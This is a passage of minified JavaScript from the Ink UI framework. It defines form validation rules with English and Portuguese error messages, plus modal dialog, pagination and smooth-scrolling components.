e=null;u&&(e=this._transitionWillOccur(this._getRecentDrawer())),r.removeClassName(document.body,[this._options.mode,this._direction]),e?o.one(document.body,u.eventName,this._handlers.afterTransition):this._handlers.afterTransition()}}},e.createUIComponent(s),s})),Ink.createModule("Ink.UI.FormValidator","2",["Ink.UI.Common_1","Ink.Dom.Element_1","Ink.Dom.Event_1","Ink.Dom.Selector_1","Ink.Dom.Css_1","Ink.Util.Array_1","Ink.Util.I18n_1","Ink.Util.Validator_1"],(function(e,t,n,i,o,r,a,s){"use strict";function l(e){switch(e.nodeName.toLowerCase()){case"select":var t=Ink.s("option:checked",e);return t?t.value:"";case"textarea":return e.value;case"input":if(!("type"in e))return e.value;if("radio"===e.type||"checkbox"===e.type){if(e.checked)return e.value}else if("file"!==e.type)return e.value;return;default:return e.innerHTML}}function c(){e.BaseUIComponent.apply(this,arguments)}function u(){e.BaseUIComponent.apply(this,arguments)}var d={required:function(e){return void 0!==e&&!/^\s*$/.test(e)},min_length:function(e,t){return"string"==typeof e&&e.length>=parseInt(t,10)},max_length:function(e,t){return"string"==typeof e&&e.length<=parseInt(t,10)},exact_length:function(e,t){return"string"==typeof e&&e.length===parseInt(t,10)},email:function(e){return"string"==typeof e&&s.mail(e)},url:function(e,t){return t=t||!1,"string"==typeof e&&s.url(e,t)},ip:function(e,t){return"string"==typeof e&&s.isIP(e,t)},phone:function(e,t){if("string"!=typeof e)return!1;var n=t?t.toUpperCase():"";return s["is"+n+"Phone"](e)},credit_card:function(e,t){return"string"==typeof e&&s.isCreditCard(e,t||"default")},date:function(e,t){return"string"==typeof e&&s.isDate(t,e)},alpha:function(e,t){return s.ascii(e,{singleLineWhitespace:t})},text:function(e,t,n){return s.unicode(e,{singleLineWhitespace:t,numbers:!0,unicodePunctuation:n})},latin:function(e,t,n){return"string"==typeof e&&s.latin1(e,{latin1Punctuation:t,singleLineWhitespace:n,numbers:!0})},alpha_numeric:function(e){return s.ascii(e,{numbers:!0})},alpha_dash:function(e){return s.ascii(e,{dash:!0,underscore:!0})},digit:function(e){return"string"==typeof e&&/^[0-9]{1}$/.test(e)},integer:function(e,t){return s.number(e,{negative:!t,decimalPlaces:0})},decimal:function(e,t,n,i){return s.number(e,{decimalSep:t||".",decimalPlaces:+n||null,maxDigits:+i})},numeric:function(e,t,n,i){return t=t||".",-1!==e.indexOf(t)?d.decimal(e,t,n,i):d.integer(e)},range:function(e,t,n,i){return e=+e,t=+t,n=+n,!(isNaN(e)||isNaN(t)||isNaN(n)||e<t||e>n||i&&(e-t)%i!=0)},color:function(e){return s.isColor(e)},matches:function(e,t){var n=this.getFormElements()[t];if(!n){for(var i=Ink.ss("input, select, textarea, .control-group",this._options.form._element),o=0;o<i.length;o++)if((i[o].name||i[o].id)===t)return l(i[o])===e;return!1}var r=(n=n[0]).getValue();return(!n._rules.required||""!==r)&&e===r},ean:function(e){return s.isEAN(e.replace(/[^\d]/g,""),"ean-13")}},h=new a({en_US:{"formvalidator.generic_error":"{field} is invalid","formvalidator.required":"Filling {field} is mandatory","formvalidator.min_length":"The {field} must have a minimum size of {param1} characters","formvalidator.max_length":"The {field} must have a maximum size of {param1} characters","formvalidator.exact_length":"The {field} must have an exact size of {param1} characters","formvalidator.email":"The {field} must have a valid e-mail address","formvalidator.url":"The {field} must have a valid URL","formvalidator.ip":"The {field} does not contain a valid {param1} IP address","formvalidator.phone":"The {field} does not contain a valid {param1} phone number","formvalidator.credit_card":"The {field} does not contain a valid {param1} credit card","formvalidator.date":"The {field} should contain a date in the {param1} format","formvalidator.alpha":"The {field} should only contain letters","formvalidator.text":"The {field} should only contain alphabetic characters","formvalidator.latin":"The {field} should only contain alphabetic characters","formvalidator.alpha_numeric":"The {field} should only contain letters or numbers","formvalidator.alpha_dash":"The {field} should only contain letters or dashes","formvalidator.digit":"The {field} should only contain a digit","formvalidator.integer":"The {field} should only contain an integer","formvalidator.decimal":"The {field} should contain a valid decimal number","formvalidator.numeric":"The {field} should contain a number","formvalidator.range":"The {field} should contain a number between {param1} and {param2}","formvalidator.color":"The {field} should contain a valid color","formvalidator.matches":"The {field} should match the field {param1}"},pt_PT:{"formvalidator.generic_error":"{field} inválido","formvalidator.required":"Preencher {field} é obrigatório","formvalidator.min_length":"{field} deve ter no mínimo {param1} caracteres","formvalidator.max_length":"{field} tem um tamanho máximo de {param1} caracteres","formvalidator.exact_length":"{field} devia ter exactamente {param1} caracteres","formvalidator.email":"{field} deve ser um e-mail válido","formvalidator.url":"O {field} deve ser um URL válido","formvalidator.ip":"{field} não tem um endereço IP {param1} válido","formvalidator.phone":"{field} deve ser preenchido com um número de telefone {param1} válido.","formvalidator.credit_card":"{field} não tem um cartão de crédito {param1} válido","formvalidator.date":"{field} deve conter uma data no formato {param1}","formvalidator.alpha":"O campo {field} deve conter apenas caracteres alfabéticos","formvalidator.text":"O campo {field} deve conter apenas caracteres alfabéticos","formvalidator.latin":"O campo {field} deve conter apenas caracteres alfabéticos","formvalidator.alpha_numeric":"{field} deve conter apenas letras e números","formvalidator.alpha_dash":"{field} deve conter apenas letras e traços","formvalidator.digit":"{field} destina-se a ser preenchido com apenas um dígito","formvalidator.integer":"{field} deve conter um número inteiro","formvalidator.decimal":"{field} deve conter um número válido","formvalidator.numeric":"{field} deve conter um número válido","formvalidator.range":"{field} deve conter um número entre {param1} e {param2}","formvalidator.color":"{field} deve conter uma cor válida","formvalidator.matches":"{field} deve corresponder ao campo {param1}"}},"en_US");return c._name="FormElement_1",c._optionDefinition={label:["String",null],rules:["String",null],error:["String",null],autoReparse:["Boolean",!1],form:["Object"]},c.prototype={_init:function(){this._errors={},this._rules={},this._value=null,this._forceInvalid=null,this._forceValid=null,this._errorParagraph=null,null===this._options.label&&(this._options.label=this._getLabel()),this._elementHadDataRules=this._element.hasAttribute("data-rules")},_getLabel:function(){var e=t.findUpwardsBySelector(this._element,".control-group label");return e?t.textContent(e):this._element.name||this._element.id||""},_parseRules:function(e){this._rules={};var t,n,i,o,r=(e=e.split("|")).length;if(r>0)for(t=0;t<r;t++)if(n=e[t])if(-1!==(o=n.indexOf("["))){for(var a=0,s=(i=(i=(i=(i=n.substr(o+1)).split("]"))[0]).split(",")).length;a<s;a++)i[a]="true"===i[a]||"false"!==i[a]&&i[a];i.splice(0,0,this.getValue()),n=n.substr(0,o),this._rules[n]=i}else this._rules[n]=[this.getValue()]},_addError:function(e){"string"==typeof e&&(e={rule:e});var t=e.rule,n=e.message;if(!n&&!t)throw new Error("FormElement#_addError: Please pass an error message, or a rule that was broken");if(!n){for(var i=this._rules[t]||[],o={field:this._options.label,value:this.getValue()},r=1;r<i.length;r++)o["param"+r]=i[r];var a="formvalidator."+t;this._options.error?n=this._options.error:(n=this._options.form.getI18n().text(a,o))===a&&(n="[Validation message not found for rule ]"+t)}this._errors[t]=n},getValue:function(){return l(this._element)},getLabel:function(){return this._options.label},getErrors:function(){return this._errors},getElement:function(){return this._element},getFormElements:function(){return this._options.form._formElements},setRules:function(e){this._options.rules=e},forceInvalid:function(e){this._forceInvalid=e||this._options.form.getI18n().text("formvalidator.generic_error",{field:this.getLabel()})},unforceInvalid:function(){this._forceInvalid=null},forceValid:function(){this._forceValid=!0},unforceValid:function(){this._forceValid=!1},getControlGroup:function(){return o.hasClassName(this._element,"control-group")?this._element:t.findUpwardsByClass(this._element,"control-group")},getControl:function(){return o.hasClassName(this._element,"control-group")?Ink.s(".control",this._element)||void 0:t.findUpwardsByClass(this._element,"control")},removeErrors:function(){var e=this.getControlGroup();e&&o.removeClassName(e,["validation","error"]),this._errorParagraph&&t.remove(this._errorParagraph)},displayErrors:function(){this.validate(),this.removeErrors();var e=this.getErrors(),n=[];for(var i in e)e.hasOwnProperty(i)&&n.push(e[i]);if(n.length){var r=this.getControlGroup(),a=this.getControl();r&&o.addClassName(r,["validation","error"]);var s=document.createElement("p");o.addClassName(s,"tip"),a||r?(a||r).appendChild(s):t.insertAfter(s,this._element),s.innerHTML=n.join("<br/>"),this._errorParagraph=s}},validate:function(){if(this._forceValid)return this._errors={},!0;if(this._element.disabled)return!0;if(this._forceInvalid)return this._addError({message:this._forceInvalid}),!1;if(this._errors={},this._options.autoReparse){var e=this._element.getAttribute("data-rules");if(e)this._options.rules=e;else if(this._elementHadDataRules&&!this._element.hasAttribute("data-rules"))return!0}if(this._parseRules(this._options.rules),""!==this.getValue()||"required"in this._rules||"matches"in this._rules)for(var t in this._rules)if(this._rules.hasOwnProperty(t)){if("function"!=typeof d[t])return Ink.warn('Rule "'+t+'" not found. Used in element:',this._element),this._addError({message:this._options.form.getI18n().text("formvalidator.generic_error",{field:this.getLabel()})}),!1;if(!1===d[t].apply(this,this._rules[t]))return this._addError({rule:t}),!1}return!0}},e.createUIComponent(c),u._name="FormValidator_1",u._optionDefinition={lang:["String",null],eventTrigger:["String","submit"],neverSubmit:["Boolean",!1],autoReparse:["Boolean",!1],searchFor:["String","input, select, textarea, .control-group"],beforeValidation:["Function",void 0],onError:["Function",void 0],onSuccess:["Function",void 0],extraValidation:["Function",void 0]},u.setRule=function(e,t,n){if(d[e]=n,h.getKey("formvalidator."+e)!==t){var i={};i["formvalidator."+e]=t;var o={};o[h.lang()]=i,h.append(o)}},u.getI18n=function(){return h},u.setI18n=function(e){h=e},u.appendI18n=function(){h.append.apply(h,[].slice.call(arguments))},u.setLanguage=function(e){h.lang(e)},u.getRules=function(){return d},u.prototype={_init:function(){this._rootElement=this._element,this._formElements={},this._errorMessages=[],this._markedErrorElements=[],"string"==typeof this._options.eventTrigger&&n.observe(this._rootElement,this._options.eventTrigger,Ink.bindEvent(this.validate,this)),this._options.lang&&this.setLanguage(this._options.lang)},getElements:function(){var e;for(var n in this._formElements||(this._formElements={}),this._formElements)if(this._formElements.hasOwnProperty(n)){for(e=this._formElements[n].length;e--;)t.isAncestorOf(document.documentElement,this._formElements[n][e]._element)||(this._formElements[n][e].removeErrors(),this._formElements[n].splice(e,1));0===this._formElements[n].length&&delete this._formElements[n]}var o=i.select(this._options.searchFor,this._rootElement);for(e=0;e<o.length;e+=1){var r=o[e];if("rules"in t.data(r)){var a,s={form:this};"name"in r&&r.name?a=r.name:"id"in r&&r.id?a=r.id:(a="element_"+Math.floor(100*Math.random()),r.id=a),a in this._formElements||(this._formElements[a]=[]);var l=this._getOrCreateFormElementInstance(a,r,s);l&&this._formElements[a].push(l)}}return this._formElements},_getOrCreateFormElementInstance:function(e,t,n){for(var i=0;i<this._formElements[e].length;i++)if(this._formElements[e][i].getElement()===t)return null;return t.getAttribute("data-auto-reparse")||(n.autoReparse=this._options.autoReparse),new c(t,n)},setI18n:function(e){e.clone&&(e=e.clone()),this.i18n=e},getI18n:function(){return this.i18n||h},setLanguage:function(e){this.i18n||this.setI18n(h),this.i18n.lang(e)},getLanguage:function(){return this.i18n?this.i18n.lang():h.lang()},validate:function(e){this._options.neverSubmit&&e&&n.stopDefault(e),this.getElements(),"function"==typeof this._options.beforeValidation&&this._options.beforeValidation.call(this,{event:e,validator:this,elements:this._formElements}),o.removeClassName(this._element,"form-error");var t=[];for(var i in this._formElements)if(this._formElements.hasOwnProperty(i))for(var r=0;r<this._formElements[i].length;r+=1)this._formElements[i][r].removeErrors(),this._formElements[i][r].validate()||t.push(this._formElements[i][r]);var a=0===t.length;if("function"==typeof this._options.extraValidation){var s={event:e,validator:this,elements:this._formElements,errorCount:t.length};!1===this._options.extraValidation.call(this,s)&&(a=!1)}return a?"function"==typeof this._options.onSuccess&&this._options.onSuccess():(e&&n.stopDefault(e),"function"==typeof this._options.onError&&this._options.onError(t),this._invalid(t)),a},_invalid:function(e){e=e||[],this._errorMessages=[],o.addClassName(this._element,"form-error");for(var t=0;t<e.length;t++)e[t].displayErrors()}},e.createUIComponent(u),u.FormElement=c,u.validationFunctions=d,u})),Ink.createModule("Ink.UI.Modal","1",["Ink.UI.Common_1","Ink.Dom.Event_1","Ink.Dom.Css_1","Ink.Dom.Element_1","Ink.Dom.Selector_1","Ink.Util.Array_1"],(function(e,t,n,i,o,r){"use strict";function a(){e.BaseUIComponent.apply(this,arguments)}var s=function(e){return e.style.opacity="invalid","invalid"!==e.style.opacity}(i.create("div",{style:"opacity: 1"})),l=function(e){var t=parseInt(window.innerHeight/2,10),n=parseInt((window.getComputedStyle?getComputedStyle(e,null):e.currentStyle).height,10),i=parseInt(window.innerWidth/2,10),o=parseInt((window.getComputedStyle?getComputedStyle(e,null):e.currentStyle).width,10);return n===t&&o===i}(i.create("div",{style:"height:50vh;width:50vw"})),c=function(e){return""!==e.style.display}(i.create("div",{style:"display: flex"})),u=function(e){var t=-1!==(e=e.replace(/^\s+|\s+$/g,"")).indexOf("%"),n=-1!==e.indexOf("px");return t||n?!t&&n||!n&&t?e:e+"px":e+"%"},d=function(e,t){for(var n,i=e.split(/\s+/g),o=0;o<i.length;o++){var r=i[o].split("-"),a=r[0].replace(/^\s+|\s+$/g,"");if(a===t)return u(r[1]);"all"===a&&(n=u(r[1]))}return n},h=[];return a._name="Modal_1",a._optionDefinition={width:["String","90%"],height:["String","90%"],shadeClass:["String",void 0],modalClass:["String",void 0],trigger:["String",void 0],triggerEvent:["String","click"],autoDisplay:["Boolean",!0],markup:["String",void 0],onShow:["Function",void 0],onDismiss:["Function",void 0],closeOnClick:["Boolean",!1],closeOnEscape:["Boolean",!0],responsive:["Boolean",!0]},a.prototype={_init:function(){if(this._handlers={click:Ink.bindEvent(this._onShadeClick,this),keyDown:Ink.bindEvent(this._onKeyDown,this),resize:null},this._dimensionIsVariant={width:-1!==(""+this._options.width).indexOf(" "),height:-1!==(""+this._options.height).indexOf(" ")},this._isOpen=!1,this._element?this._markupMode=n.hasClassName(this._element,"ink-modal"):this._markupMode=!1,this._markupMode){if(this._modalDiv=this._element,this._modalShadow=this._modalDiv.parentNode,this._contentContainer=o.select(".modal-body",this._modalDiv)[0],!this._contentContainer)throw new Error('Ink.UI.Modal: Missing div with class "modal-body"');this._options.markup=this._contentContainer.innerHTML}else this._modalShadow=i.create("div",{className:"ink-shade"}),this._modalDiv=i.create("div",{className:"ink-modal ink-space"}),this._element&&(this._options.markup=this._element.innerHTML),this._modalShadow.appendChild(this._modalDiv),document.body.appendChild(this._modalShadow);if(this._markupMode||this.setContentMarkup(this._options.markup),"string"==typeof this._options.shadeClass&&n.addClassName(this._modalShadow,this._options.shadeClass),"string"==typeof this._options.modalClass&&n.addClassName(this._modalDiv,this._options.modalClass),this._options.trigger){var r=e.elsOrSelector(this._options.trigger,"");t.observeMulti(r,this._options.triggerEvent,Ink.bindEvent(this.open,this))}else this._options.autoDisplay&&this.open()},_dimensionIsPercentage:function(){var e=this._getDimensions();return{width:-1!==(""+e.width).indexOf("%"),height:-1!==(""+e.height).indexOf("%")}},_getDimensions:function(t){t=t||{};var n,o={width:this._options.width,height:this._options.height};if((this._dimensionIsVariant.width||this._dimensionIsVariant.height)&&(n=e.currentLayout()),this._dimensionIsVariant.width&&(o.width=d(o.width,n)),this._dimensionIsVariant.height&&(o.height=d(o.height,n)),t.dynamic){var r=this._dimensionIsPercentage();if(!r.width){var a=.9*i.viewportWidth();parseFloat(o.width)>=a&&(o.width=a+"px")}if(!r.height){var s=.9*i.viewportHeight();parseFloat(o.height)>=s&&(o.height=s+"px")}}return o},_reposition:function(){var e,t=this._dimensionIsPercentage(),n=this._getDimensions();l&&t.height?this._modalDiv.style.marginTop=-parseFloat(n.height)/2+"vh":l?(e=parseFloat(n.height)>.9*i.viewportHeight())===this._heightWasLargerThan90Percent&&e&&!this._dimensionIsVariant.height||(this._heightWasLargerThan90Percent=e,e?(this._modalDiv.style.marginTop="0",this._modalDiv.style.top="5vh"):(this._modalDiv.style.marginTop=-parseFloat(n.height)/2+"px",this._modalDiv.style.top="")):this._modalDiv.style.marginTop=-i.elementHeight(this._modalDiv)/2+"px",l&&t.width?this._modalDiv.style.marginLeft=-parseFloat(n.width)/2+"vw":l?(e=parseFloat(n.width)>.9*i.viewportWidth())===this._widthWasLargerThan90Percent&&e&&!this._dimensionIsVariant.width||(this._widthWasLargerThan90Percent=e,e?(this._modalDiv.style.marginLeft="0",this._modalDiv.style.left="5vw"):(this._modalDiv.style.marginLeft=-parseFloat(n.width)/2+"px",this._modalDiv.style.left="")):this._modalDiv.style.marginLeft=-i.elementWidth(this._modalDiv)/2+"px"},_onResize:function(){var e=this._dimensionIsVariant.height||this._dimensionIsVariant.width,t=this._dimensionIsPercentage(),n=!t.height||!t.width;e&&this._resize(),l&&!e||this._avoidModalLargerThanScreen(),(!l||n||e)&&this._reposition(),c||this._resizeContainer()},_onShadeClick:function(e){if(this._isOpen){var r=t.element(e);if(r===this._modalShadow&&this._options.closeOnClick)this.dismiss();else if(n.hasClassName(r,"ink-close")||n.hasClassName(r,"ink-dismiss")||i.findUpwardsBySelector(r,".ink-close,.ink-dismiss")||this._options.closeOnClick&&(!i.descendantOf(this._shadeElement,r)||r===this._shadeElement)){for(var a=o.select(".ink-alert",this._shadeElement),s=a.length,l=0;l<s;l++)if(i.descendantOf(a[l],r))return;this.dismiss(),this._isOpen||t.stop(e)}}},_onKeyDown:function(e){27===e.keyCode&&this._isOpen&&this._options.closeOnEscape&&h[h.length-1]===this&&(this.dismiss(),this._isOpen||t.stopDefault(e))},_resize:function(){var e=this._getDimensions();this._modalDiv.style.width=e.width,this._modalDiv.style.height=e.height},_resizeContainer:function(){var e=i.elementHeight(this._modalDiv);this._modalHeader=o.select(".modal-header",this._modalDiv)[0],this._modalHeader&&(e-=i.elementHeight(this._modalHeader)),this._modalFooter=o.select(".modal-footer",this._modalDiv)[0],this._modalFooter&&(e-=i.elementHeight(this._modalFooter)),this._contentContainer.style.height=e+"px",this._markupMode},_resizeContainerFlex:function(){this._contentContainer.style.flex="1",this._modalDiv.style.display="flex",this._modalDiv.style.flexDirection="column"},_avoidModalLargerThanScreen:function(){var e=this._dimensionIsPercentage();if(l)e.width||(this._modalDiv.style.maxWidth="90vw"),e.height||(this._modalDiv.style.maxHeight="90vh");else{var t={height:i.viewportHeight(),width:i.viewportWidth()},n=this._getDimensions();r.forEach(["height","width"],Ink.bind((function(i){if(!e[i]){var o=Math.round(.9*t[i]);if(parseFloat(n[i])>o)this._modalDiv.style[i]=o+"px";else{if(isNaN(parseFloat(n[i])))return;this._modalDiv.style[i]=parseFloat(n[i])+"px"}}}),this))}},open:function(e){if(this.isOpen())return!1;if(e&&t.stopDefault(e),n.addClassName(this._modalShadow,"ink-shade"),this._modalShadow.style.display=this._modalDiv.style.display="block",this._modalShadow.offsetHeight,n.addClassName(this._modalShadow,"visible"),n.addClassName(this._modalDiv,"visible"),this._contentElement=this._modalDiv,this._shadeElement=this._modalShadow,this._markupMode||this.setContentMarkup(this._options.markup),this._resize(),this._avoidModalLargerThanScreen(),this._reposition(),c?this._resizeContainerFlex():this._resizeContainer(),this._options.responsive){var o=this._dimensionIsPercentage();!(l&&c&&o.height&&o.width&&!this._dimensionIsVariant.height&&!this._dimensionIsVariant.width)&&(this._handlers.resize=t.throttle(Ink.bind(this._onResize,this),500),t.observe(window,"resize",this._handlers.resize))}if(this._options.onShow){if(e)var r=i.findUpwardsBySelector(t.element(e),this._options.trigger);this._options.onShow.call(this,this,{trigger:r})}t.observe(this._shadeElement,"click",this._handlers.click),this._options.closeOnEscape&&t.observe(document,"keydown",this._handlers.keyDown),this._isOpen=!0,h.push(this),n.addClassName(document.documentElement,"ink-modal-open")},isOpen:function(){return this._isOpen},dismiss:function(){if(this._isOpen){if(this._options.onDismiss)if(!1===this._options.onDismiss(this))return;if(this._isOpen=!1,this._handlers.resize&&t.stopObserving(window,"resize",this._handlers.resize),this._markupMode?(n.removeClassName(this._modalDiv,"visible"),n.removeClassName(this._modalShadow,"visible"),this._waitForFade(this._modalShadow,Ink.bind((function(){this._modalShadow.style.display="none"}),this))):(this._modalShadow.parentNode.removeChild(this._modalShadow),this.destroy()),0===(h=r.remove(h,r.keyValue(this,h),1)).length){var e=document.documentElement;n.removeClassName(e,"ink-modal-open")}}},_waitForFade:function(e,t){if(!s)return t();var i=5,o=function(){+n.getStyle(e,"opacity")>0&&i>0?(i--,setTimeout(o,250)):t()};setTimeout(o,500)},destroy:function(){e.unregisterInstance(this._instanceId)},getContentElement:function(){return this._contentContainer||null},getModalElement:function(){return this._modalDiv||null},getShadeElement:function(){return this._modalShadow||null},setContentMarkup:function(e){if(this._markupMode)this._contentContainer.innerHTML=e;else{if(this._modalDiv.innerHTML=[e].join(""),this._contentContainer=o.select(".modal-body",this._modalDiv),!this._contentContainer.length){var t=o.select(".modal-header",this._modalDiv),a=o.select(".modal-footer",this._modalDiv);r.each(t,i.remove),r.each(a,i.remove);var s=document.createElement("div");n.addClassName(s,"modal-body"),s.innerHTML=this._modalDiv.innerHTML,this._modalDiv.innerHTML="";var l=t.concat([s]).concat(a);r.each(l,Ink.bindMethod(this._modalDiv,"appendChild")),this._contentContainer=o.select(".modal-body",this._modalDiv)}this._contentContainer=this._contentContainer[0]}this._contentElement=this._modalDiv,this._resizeContainer()}},e.createUIComponent(a,{elementIsOptional:!0}),a._vhVwSupported=l,a._flexSupported=c,a})),Ink.createModule("Ink.UI.Pagination","1",["Ink.UI.Common_1","Ink.Dom.Event_1","Ink.Dom.Css_1","Ink.Dom.Element_1","Ink.Dom.Selector_1"],(function(e,t,n,i,o){"use strict";function r(){e.BaseUIComponent.apply(this,arguments)}var a=function(e,t,n){var i=document.createElement("a");if(i.setAttribute("href","#"),"number"==typeof t&&i.setAttribute("data-index",t),n&&n.wrapText){var o=document.createElement("span");i.appendChild(o),o.innerHTML=e}else i.innerHTML=e;return i};return r._name="Pagination_1",r._optionDefinition={size:["Integer",null],totalItemCount:["Integer",null],itemsPerPage:["Integer",null],maxSize:["Integer",null],start:["Integer",1],sideButtons:["Boolean",1],firstLabel:["String","First"],lastLabel:["String","Last"],previousLabel:["String","Previous"],nextLabel:["String","Next"],previousPageLabel:["String",null],nextPageLabel:["String",null],onChange:["Function",void 0],hashParameter:["String","page"],parentTag:["String","ul"],childTag:["String","li"],wrapperClass:["String","ink-navigation"],paginationClass:["String","pagination"],activeClass:["String","active"],disabledClass:["String","disabled"],hideClass:["String","hide-all"],previousClass:["String","previous"],previousPageClass:["String","previousPage"],nextClass:["String","next"],nextPageClass:["String","nextPage"],firstClass:["String","first"],lastClass:["String","last"],numberFormatter:["Function",function(e){return e+1}],autoWrap:["Boolean",!1]},r.prototype={_init:function(){this._options.previousPageLabel||(this._options.previousPageLabel=this._options.previousLabel+" "+this._options.maxSize),this._options.nextPageLabel||(this._options.nextPageLabel=this._options.nextLabel+" "+this._options.maxSize),this._handlers={click:Ink.bindEvent(this._onClick,this)},e.isInteger(this._options.totalItemCount)&&e.isInteger(this._options.itemsPerPage)?this._size=this._calculateSize(this._options.totalItemCount,this._options.itemsPerPage):e.isInteger(this._options.size)?this._size=this._options.size:(Ink.error("Ink.UI.Pagination: Please supply a size option or totalItemCount and itemsPerPage options."),this._size=0),this._current=this._options.start-1,this._itemLiEls=[],this._generateMarkup(this._element),this._updateItems(),this._observe()},_observe:function(){t.observeDelegated(this._element,"click","."+this._options.paginationClass+" > "+this._options.childTag,this._handlers.click)},_calculateSize:function(e,t){return Math.ceil(e/t)},_updateItems:function(){var e,t,i,o=this._itemLiEls;if(this._size===o.length)for(e=0,t=this._size;e<t;++e)n.setClassName(o[e],this._options.activeClass,e===this._current);else{for(e=o.length-1;e>=0;--e)this._ulEl.removeChild(o[e]);for(o=[],e=0,t=this._size;e<t;++e)(i=document.createElement(this._options.childTag)).appendChild(a(this._options.numberFormatter(e,this._size),e)),n.setClassName(i,this._options.activeClass,e===this._current),this._nextEl?this._ulEl.insertBefore(i,this._nextEl):this._ulEl.appendChild(i),o.push(i);this._itemLiEls=o}if(this._options.maxSize){var r=Math.floor(this._current/this._options.maxSize),s=this._options.maxSize*r,l=s+this._options.maxSize-1;for(e=0,t=this._size;e<t;++e)i=o[e],n.setClassName(i,this._options.hideClass,e<s||e>l);this._pageStart=s,this._pageEnd=l,this._page=r,n.setClassName(this._prevPageEl,this._options.disabledClass,!this.hasPreviousPage()),n.setClassName(this._nextPageEl,this._options.disabledClass,!this.hasNextPage()),n.setClassName(this._firstEl,this._options.disabledClass,this.isFirst()),n.setClassName(this._lastEl,this._options.disabledClass,this.isLast())}this._prevEl&&!this._options.autoWrap&&n.setClassName(this._prevEl,this._options.disabledClass,!this.hasPrevious()),this._nextEl&&!this._options.autoWrap&&n.setClassName(this._nextEl,this._options.disabledClass,!this.hasNext())},_generateMarkup:function(e){n.addClassName(e,"ink-navigation");var t=Ink.s("."+this._options.paginationClass,e),i=!1;t?i=!0:(t=document.createElement(this._options.parentTag),n.addClassName(t,this._options.paginationClass));var o=n.hasClassName(t,"chevron"),r=n.hasClassName(t,"dotted"),s=Ink.bind((function(e,i){var o=document.createElement(this._options.childTag),r=a(this._options[e+"Label"],void 0,{wrapText:i&&i.wrapText});return n.addClassName(o,this._options[e+"Class"]),o.appendChild(r),t.appendChild(o),o}),this);!r&&this._options.maxSize&&(this._firstEl=s("first"),this._prevPageEl=s("previousPage")),(r&&o||r&&!o&&!0===this._options.sideButtons||!r&&!!this._options.sideButtons)&&(this._prevEl=s("previous",{wrapText:o}),this._nextEl=s("next",{wrapText:o})),!r&&this._options.maxSize&&(this._nextPageEl=s("nextPage"),this._lastEl=s("last")),i||e.appendChild(t),this._ulEl=t},_onClick:function(e){t.stopDefault(e);var i=t.element(e);if(!n.hasClassName(i,this._options.activeClass)&&!n.hasClassName(i,this._options.disabledClass)){var r=n.hasClassName(i,this._options.previousClass),a=n.hasClassName(i,this._options.nextClass),s=n.hasClassName(i,this._options.previousPageClass),l=n.hasClassName(i,this._options.nextPageClass),c=n.hasClassName(i,this._options.firstClass),u=n.hasClassName(i,this._options.lastClass);if(c)this.setCurrent(0);else if(u)this.setCurrent(this._size-1);else if(s||l)this.setCurrent((s?-1:1)*this._options.maxSize,!0,!!this._options.autoWrap);else if(r||a)this.setCurrent(r?-1:1,!0,!!this._options.autoWrap);else{var d=o.select("[data-index]",i)[0],h=d&&parseInt(d.getAttribute("data-index"),10);this.setCurrent(h)}}},setOnChange:function(e){if(e&&"function"!=typeof e)throw new TypeError("onChange option must be a function!");this._options.onChange=e},setSize:function(t){if(!e.isInteger(t))throw new TypeError("1st argument must be an integer number!");this._size=t,this._updateItems(),this._current=0},setSizeInItems:function(e,t){var n=Math.ceil(e/t);this.setSize(n)},setCurrent:function(t,n,i,o){if(!e.isInteger(t))throw new TypeError("1st argument must be an integer number!");n&&(t+=this._current),i?(t%=this._size)<0&&(t+=this._size):(t>this._size-1&&(t=this._size-1),t<0&&(t=0)),this._current=t,this._updateItems(),this._options.onChange&&!o&&this._options.onChange(this,t)},next:function(e){this.setCurrent(1,!0,e)},previous:function(e){this.setCurrent(-1,!0,e)},getSize:function(){return this._size},getCurrent:function(){return this._current},isFirst:function(){return 0===this._current},isLast:function(){return this._current===this._size-1},hasPrevious:function(){return this._current>0},hasNext:function(){return this._current<this._size-1},hasPreviousPage:function(){return this._options.maxSize&&this._current>this._options.maxSize-1},hasNextPage:function(){return this._options.maxSize&&this._size-this._current>=this._options.maxSize+1},destroy:e.destroyComponent},e.createUIComponent(r),r})),Ink.createModule("Ink.UI.SmoothScroller","1",["Ink.UI.Common_1","Ink.Dom.Event_1","Ink.Dom.Element_1","Ink.Dom.Selector_1","Ink.Dom.Css_1"],(function(e,t,n,i,o){"use strict";var r=window.requestAnimationFrame||function(e){return setTimeout(e,10)},a=window.cancelAnimationFrame||function(e){clearTimeout(e)},s={speed:10,changeHash:!0,margin:0,scroll:function(e,t){var i=Math.round(n.scrollHeight()),o=Math.round(e-(t.margin||0));i+=o>i?Math.ceil((o-i)/t.speed):(o-i)/t.speed,a(s.interval),i!==o&&s.offsetTop!==i?s.interval=r(Ink.bindMethod(s,"scroll",e,t),document.body):s.onDone(t),window.scrollTo(0,i),s.offsetTop=i},init:function(e){t.on(document,"click",e||"a.scrollableLink, a.ink-smooth-scroll",s.onClick)},render:function(){},onClick:function(t){var i=t.currentTarget,r=(location+"").replace(/#.*?$/,"");if((i.href+"").replace(/#.*?$/,"")===r){var a=i.getAttribute("data-hash")||(i.getAttribute("href")||"").replace(/^.*?#/,"");if(a){t.preventDefault();var l='a[name="'+a+'"],#'+a,c=Ink.s(l),u=n.findUpwardsBySelector(i,"ul");if(u){var d=Ink.s("li.active",u);o.removeClassName(d,"active")}if(c){i.parentNode&&"li"===i.parentNode.tagName.toLowerCase()&&o.addClassName(i.parentNode,"active");var h=e.options("SmoothScroller link options",{margin:["Number",s.margin],speed:["Number",s.speed],changeHash:["Boolean",s.changeHash]},{},i);s.hash=a,s.scroll(n.offsetTop(c),h)}}}},onDone:function(e){!0===e.changeHash&&(window.location.hash=s.hash),s.hash=s.offsetTop=null}};return s})),Ink.createModule("Ink.UI.Spy","1",["Ink.UI.Common_1","Ink.Dom.Event_1","Ink.Dom.Css_1","Ink.Dom.Element_1","Ink.Dom.Selector_1"],(function(e,t,n,i,o){"use strict";function r(e,t,n){var i=function(e){for(var t=0,n=c.length;t<n;t++)if(c[t][0]===e)return t;return null}(t);null===i?c.push([t,[e],n]):c[i][1].push(e)}function a(){for(var e=0,t=c.length;e<t;e++)s(c[e][0],c[e][1],c[e][2])}function s(e,t,r){for(var a=function(e,t){for(var n,i,o=-1/0,r=0,a=e.length;r<a;r++)i=e[r].getBoundingClientRect().top,t.margin&&(i-=t.margin),i<=0&&i>o&&(o=i,n=r);return void 0===n?null:e[n]}(t,r),s=o.select("li.active",e),l=0,c=s.length;l<c;l++)n.removeClassName(s[l],"active");if(null!==a){var 